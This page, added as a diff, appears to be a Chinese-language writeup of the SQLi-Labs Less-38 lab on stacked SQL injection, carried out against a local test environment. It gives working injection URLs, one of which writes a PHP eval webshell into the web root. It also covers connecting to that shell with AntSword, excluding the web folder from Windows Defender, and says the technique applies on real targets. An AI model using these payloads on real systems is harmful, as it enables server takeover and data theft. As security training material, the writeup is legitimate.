@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-38 堆叠注入与 WebShell 写入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-38 堆叠注入与 WebShell 写入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.27 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 堆叠注入, WebShell, 蚁剑</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-38 (GET - Stacked Query Injection - String)</li>
+        <li><strong>提示：</strong>基于单引号的字符型注入，后端使用 <code>mysqli_multi_query()</code> 支持堆叠执行多条语句。</li>
+    </ul>
+
+    <h2>2. 核心原理：堆叠注入 (Stacked Injections)</h2>
+    <p>常规的 <code>UNION</code> 注入只能执行 <code>SELECT</code> 语句，且受限于列数和回显点。而堆叠注入利用分号 <code>;</code> 强行切断原有查询，并在同一个数据库连接中执行多条完全独立的 SQL 语句（如 <code>INSERT</code>、<code>UPDATE</code>、<code>DROP</code>）。</p>
+    <p><strong>应用场景：</strong>结合 <code>INTO OUTFILE</code> 语句，堆叠注入可以直接向目标服务器的物理磁盘写入文件（如 WebShell），从而获取服务器控制权。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：验证堆叠注入与副作用</strong></p>
+    <p>页面仅回显第一条 <code>SELECT</code> 的结果，插入操作不会直接回显，需通过“副作用”验证。</p>
+    <p><strong>输入 URL（插入数据）：</strong><code>?id=1'; insert into users(id,username,password) values(999,'pwn38','pwn38')-- -</code></p>
+    <p><strong>访问验证：</strong><code>?id=999</code>，页面成功显示 <code>Your Username is : pwn38</code>，证明堆叠语句被执行。</p>
+    <p><em>清理测试数据：</em><code>?id=1'; delete from users where id=999-- -</code></p>
+
+    <p><strong>第二步：利用 INTO OUTFILE 写入 WebShell</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1'; select '<?php @eval($_POST["cmd"]); ?>' into outfile 'D:/phpstudy_pro/WWW/sqli-labs-master/Less-38/shell.php'-- -</code></p>
+    <p><strong>解释与原理：</strong>利用单引号闭合 <code>id=1</code>，使用分号结束原查询，执行 <code>select ... into outfile</code> 语句，将一句话木马代码写入服务器的 Web 目录下。注意 Windows 路径需使用正斜杠 <code>/</code>。</p>
+
+    <p><strong>第三步：使用中国蚁剑连接 WebShell</strong></p>
+    <p>在本地物理路径确认 <code>shell.php</code> 生成后，打开中国蚁剑：</p>
+    <ol>
+        <li>右键空白处选择“添加数据”。</li>
+        <li><strong>URL 地址：</strong>填入 <code>http://localhost/sqli-labs-master/Less-38/shell.php</code>。</li>
+        <li><strong>连接密码：</strong>填入木马中设置的参数名 <code>cmd</code>。</li>
+        <li>点击“测试连接”，成功后双击进入。</li>
+    </ol>
+    <p><strong>结果：</strong>成功进入图形化文件管理界面，可自由浏览、修改、上传服务器文件。</p>
+
+    <h2>4. 工具配置与环境踩坑（中国蚁剑）</h2>
+    <ul>
+        <li><strong>杀软拦截与白名单</strong>：在本地测试时，由于一句话木马特征明显，Windows Defender 会将其隔离。需在“Windows 安全中心 -> 病毒和威胁防护 -> 排除项”中，将靶场所在的 <code>D:\phpstudy_pro\WWW</code> 文件夹加入白名单，防止木马被删除。</li>
+        <li><strong>虚拟终端 <code>ret=-1</code> 现象</strong>：蚁剑虚拟终端本质是调用 PHP 的 <code>system()</code> 等函数执行系统命令。由于本地环境 Defender 实时保护会拦截 <code>cmd.exe</code> 进程的创建，导致函数返回 <code>-1</code>。在真实的 HVV 环境中，若对方服务器未部署严格杀软且函数未被禁用，则可直接获得命令执行权限。</li>
+        <li><strong>替代方案</strong>：在终端被拦截时，蚁剑的“文件管理”功能依赖纯 PHP 函数，不受杀软拦截影响，可直接下载服务器源码或配置文件。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>堆叠注入 (Stacked Injection)</strong>：利用 <code>;</code> 执行任意 SQL 语句，突破 SELECT 限制。</li>
+        <li><strong>INTO OUTFILE 写文件</strong>：将数据库查询结果写入文件系统，是获取 WebShell 的核心手段之一（需数据库具备写权限）。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
